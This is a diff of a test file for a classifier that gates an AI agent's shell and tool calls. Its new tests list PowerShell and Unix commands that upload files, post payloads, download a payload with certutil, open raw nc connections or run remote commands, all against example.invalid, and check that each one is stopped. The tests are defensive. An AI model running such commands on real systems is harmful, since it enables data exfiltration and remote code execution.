@@ -20,7 +20,7 @@ import { join } from 'node:path'
 import test from 'node:test'
 
 const root = new URL('..', import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, '$1')
-const { classifyCall, RISK } = await import('../src/gate.js')
+const { classifyCall, flattenArgs, RISK } = await import('../src/gate.js')
 // The credential-shaped path is shared with `gate-installed.test.mjs` so the name is
 // assembled from parts in exactly one place. See `support/fixtures.mjs`.
 const { secretShapedPath } = await import('./support/fixtures.mjs')
@@ -285,4 +285,78 @@ test('the same stores are refused when reached through a shell, not only through
   const viaShell = classify('pwsh', { command: `Get-Content "${store}"` })
   assert.equal(viaShell.decision, 'deny', 'a credential read through a shell is still a credential read')
   assert.equal(viaShell.rule, 'secret:credentials-yaml')
+})
+
+// ------------------------------------------------------- reaching the network
+
+/**
+ * The outbound rules were written for the platform the author was imagining.
+ *
+ * Everything in `OUTBOUND_PATTERNS` was shaped like a Unix CLI tool, while this plugin ships to
+ * Windows and its shell is PowerShell. Measured before the native cmdlets were added: twelve
+ * distinct ways to move data off this machine, every one of them `allow`, while the same intent
+ * through `curl` asked. The controls below were allowed too, so the classifier was working — the
+ * table was simply written for somewhere else.
+ *
+ * Every case here goes through `classifyCall` with a real tool argument object, never through a
+ * pattern directly. That is not style: the first version of the remote-host rules was anchored to
+ * the start of the text and matched nothing in production, while a test that fed the pattern a
+ * bare command string passed happily. The text a rule sees is built by `flattenArgs`, and it
+ * carries the argument's key in front of its value.
+ */
+const REACHES_OUT = [
+  ['powershell rest call', { command: 'Invoke-RestMethod -Uri https://example.invalid/collect -Method Post -Body $payload' }],
+  ['powershell web request', { command: 'Invoke-WebRequest -Uri https://example.invalid/collect -Method Post -InFile report.txt' }],
+  ['powershell aliases', { command: 'irm https://example.invalid/collect -Method Post -Body $payload' }],
+  ['powershell bits upload', { command: 'Start-BitsTransfer -TransferType Upload -Source report.zip -Destination https://example.invalid' }],
+  ['.NET client upload', { script: "$wc = New-Object Net.WebClient; $wc.UploadFile('https://example.invalid', 'report.zip')" }],
+  ['mail with an attachment', { command: 'Send-MailMessage -To someone@example.invalid -SmtpServer mail.invalid -Attachments report.zip' }],
+  ['payload download', { command: 'certutil -urlcache -split -f https://example.invalid/payload.exe' }],
+  ['copy to a host', { command: 'scp report.zip user@example.invalid:/tmp' }],
+  ['raw connection', { command: 'nc example.invalid 4444' }],
+  ['sync to a host', { command: 'rsync -e ssh report.zip user@example.invalid:/tmp' }],
+  ['shell on a host', { command: 'ssh example.invalid' }],
+  ['remote powershell', { command: 'Invoke-Command -ComputerName example.invalid -ScriptBlock { whoami }' }],
+]
+
+test('every way this platform actually reaches the network stops and asks', () => {
+  const open = []
+  for (const [label, args] of REACHES_OUT) {
+    const result = classify('pwsh', args)
+    if (result.decision === 'allow') open.push(`${label} -> ${result.rule}`)
+  }
+  assert.deepEqual(open, [], `outbound paths left ungated:\n    ${open.join('\n    ')}`)
+})
+
+test('local work, and a plain fetch with nothing sent, are still allowed', () => {
+  // The counterpart to the audit above. A rule set that closes the network by refusing
+  // everything is the over-broad closure this project has already paid for twice.
+  for (const args of [
+    { command: 'Get-ChildItem D:\\Projects' },
+    { command: 'Invoke-WebRequest https://example.invalid/docs' },
+    { command: 'git status --short' },
+    { command: 'node --test test/gate.test.mjs' },
+  ]) {
+    assert.equal(classify('pwsh', args).decision, 'allow', `${JSON.stringify(args)} should not stop`)
+  }
+})
+
+test('prose that names these verbs is not a command, so the gate can still read about itself', () => {
+  // This project has had its own documentation refused twice for containing a rule's own text.
+  // The verbs here are ordinary words, so the rules aim at operands instead of at bare words.
+  for (const text of [
+    'ssh, scp and sftp are the usual ways to move a file to another machine',
+    'rsync is a protocol: it copies files between machines',
+    'note that nc is short for netcat',
+  ]) {
+    assert.equal(classify('pwsh', { command: text }).decision, 'allow', `prose was treated as a command: ${text}`)
+  }
+})
+
+test('a rule anchored to the start of a command would be dead in production', () => {
+  // The trap that produced the first, silently useless version of the remote-host rules.
+  assert.equal(flattenArgs({ command: 'echo hi' }), 'command echo hi')
+  assert.equal(classify('pwsh', { command: 'echo hi' }).decision, 'allow')
+  // ...and the same call, aimed at a host, is caught even though the text never begins with it.
+  assert.equal(classify('pwsh', { command: 'scp a.zip user@example.invalid:/tmp' }).decision, 'ask')
 })
